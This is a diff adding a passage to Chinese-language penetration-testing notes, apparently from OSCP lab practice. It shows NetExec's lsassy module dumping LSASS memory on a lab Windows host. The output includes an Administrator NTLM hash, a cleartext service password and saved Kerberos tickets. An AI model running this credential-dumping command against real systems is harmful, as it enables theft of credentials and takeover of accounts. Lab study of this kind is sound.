@@ -174,3 +174,35 @@ ii  python3-impacket                       0.13.0+git20251120-9c2d8b6-0kali1    
 └─$ nxc smb -M lsassy -o METHOD=help
 usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT]
 ```
+#### 但是在OSCP自带的kali是可以的,而且是不需要添加域名到/etc/hosts的
+```
+$ nxc smb 192.168.51.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Creating missing folder logs/sam
+[*] Creating missing folder logs/lsa
+[*] Creating missing folder logs/ntds
+[*] Creating missing folder logs/dpapi
+[*] Creating default workspace
+[*] Initializing RDP protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing FTP protocol database
+[*] Initializing NFS protocol database
+[*] Initializing VNC protocol database
+[*] Initializing SSH protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing WMI protocol database
+[*] Initializing SMB protocol database
+[*] Copying default configuration file
+SMB         192.168.51.95   445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)
+SMB         192.168.51.95   445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
+LSASSY      192.168.51.95   445    SECURE           Saved 8 Kerberos ticket(s) to /home/kali/.nxc/modules/lsassy
+LSASSY      192.168.51.95   445    SECURE           SECURE\Administrator a51493b0b06e5e35f855245e71af1d14
+LSASSY      192.168.51.95   445    SECURE           era.secura.local\apache New2Era4.!
+```
